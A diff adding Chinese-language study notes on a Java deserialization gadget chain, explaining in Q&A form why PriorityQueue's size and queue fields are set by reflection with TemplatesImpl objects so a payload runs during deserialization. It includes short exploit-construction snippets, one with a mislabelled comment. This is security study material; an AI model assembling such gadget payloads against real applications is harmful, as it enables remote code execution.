@@ -1301,3 +1301,44 @@ A1：
 ```
 
 若无这两行代码，则创建的queue的size属性为0。
+
+这会导致反序列化时queue为空。
+
+因此Exp也可以改为：
+
+```java
+    PriorityQueue queue = new PriorityQueue(2);//使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。
+    Field field4=queue.getClass().getDeclaredField("size");//获取PriorityQueue的size字段
+    field4.setAccessible(true);//暴力反射
+    field4.set(queue,2);//设置queue的comparator字段值为comparator
+```
+
+Q2：
+
+为何要用1、2占位，不能直接add`templatesImpl`​？
+
+A2:
+
+因为会报错：
+
+​`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl cannot be cast to java.lang.Comparable`​
+
+而利用反射时
+
+```java
+    Field field3=queue.getClass().getDeclaredField("queue");//获取queue的queue字段
+    field3.setAccessible(true);//暴力反射
+    field3.set(queue,new Object[]{templatesImpl,templatesImpl});//设置queue的queue字段内容Object数组，内容为templatesImpl
+```
+
+Java并不会检查是否合法，而在反序列化时，由于payload执行早于排序，因此不影响。
+
+#### quenue反序列化
+
+Q：
+
+PriorityQueue的queue已经使用transient关键字修饰，为什么还能从流中反序列化queue中的元素？
+
+A：
+
+[序列化规范](https://docs.oracle.com/javase/8/docs/platform/serialization/spec/output.html#a861 "序列化规范")允许待序列化的类实现writeObject方法，实现对自己的成员控制权。
